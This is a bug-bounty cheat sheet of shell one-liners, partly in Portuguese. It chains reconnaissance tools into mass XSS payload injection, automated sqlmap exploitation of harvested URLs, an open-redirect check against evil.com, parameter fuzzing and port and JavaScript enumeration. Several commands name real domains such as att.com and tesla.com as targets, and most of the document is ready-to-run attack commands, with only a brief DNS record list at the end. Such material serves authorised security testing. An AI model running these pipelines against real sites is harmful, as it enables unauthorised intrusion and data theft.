## General Commands

#### _xargs_ (carrega lista para uma tool)
 
 https://linuxhandbook.com/xargs-command/

 ``` $ xargs -a lista -I@ sh -c 'python3 paramspider.py -d "@"' ```

``` $ python3 paramspider.py -d | kxss ```

``` $ wfuzz -c -w burp-parameter-name.txt http://domain/index.php?FUZZ=test ```

``` $ wfuzz -c -w burp-parameter-name.txt http://domain/index.php?search=FUZZ ```

# OneLiners

## Subdomain enum

#### _Subdomain enum with JLDC_

 https://github.com/brunosergi0/curlmeallsubdomains
 https://github.com/Fadavvi/Sub-Drill/blob/master/Sub-Drill.sh

 ``` $ curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?((\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew file" ```

## XSS

#### _xss with freq_

 https://github.com/takshal/freq

 ``` $ echo domain.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror-alert(1);>' | freq | grep -v 'Not' ```

#### _XSS with gau_

 https://github.com/s0md3v/uro

 ``` $ echo domain.com | gau | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss - payload "confirm(1)" | grep -v 'Not' ```
 
 ``` $ echo domain.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss - payload "confirm(1)" ```

 #### _find xss with hakrawler_

 https://github.com/hakluke/hakrawler

 ``` $ echo domain.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep -v 'Not' ``` 


 #### xss automation

``` $ echo domains-with-params | gxss -p test | dalfox pipe --mining-dict-word arjun/params.txt --skip-bav -o file.txt ```

``` $ echo domains | waybackurls | uro | gf xss | dalfox pipe --skip-bav ```

https://github.com/hahwul/dalfox

https://github.com/RenwaX23/XSSTRON


## SQLi

#### _SQLi_

 https://github.com/Findomain/Findomain

 ``` $ findomain -t domain.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1 ```

 ``` $ echo domains | httpx -silent | anew | waybackurls | gf sqli >> sqli.txt ; sqlmap -m sqli.txt --batch --random-agent --level 1 ```

## OpenRedirect

 #### _Open Redirect_

 https://github.com/tomnomnom/qsreplace
 
 ``` $ waybackurls domain.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done ```
 

## PortScan

#### _port scan_

 https://github.com/j3ssie/sdlookup
 
 ``` $ echo domain.com | subfinder -silent | httpx -silent -ip | awk '{print $2}' | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python -m json.tool' ```
 
 
 ``` $ echo doamin.com | httpx -silent -ip | awk '{print $2}' | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python -m json.tool' ```

## Enum javascript

 ``` $ echo tesla.com | gau | subjs ```
 
 ``` $ echo tesla.com | gau | grep -iE '\.js' ```
 
 ``` $ cat tesla | httpx -status-code -mc 200 -content-type | grep 'application/json' ```
 
 ``` $ cat tesla | httpx -status-code -mc 200 | anew ```

 ``` $ echo domains | waybakcurls| getJS ```


#### send notifications to multiple places 

https://github.com/projectdiscovery/notify

https://crontab-generator.org/

# Automation 

- https://github.com/KingOfBugbounty/DockerHunt

- https://hub.docker.com/r/mswell/hacktools

``` $ echo domains | gau | hakcheckurl | grep -v '404|999|403|500' ```

## DNS

- A -> ipv4
- AAAA -> ipv6
- CNAME -> domains
- TXT -> notes/text
- MX -> email servers
- SOA -> domains validations
- NS -> authority servers

### dig 

- https://www.cyberciti.biz/faq/linux-unix-dig-command-examples-usage-syntax/
- https://www.thegeekstuff.com/2012/02/dig-command-examples/
- https://www.hostinger.com/tutorials/how-to-use-the-dig-command-in-linux/
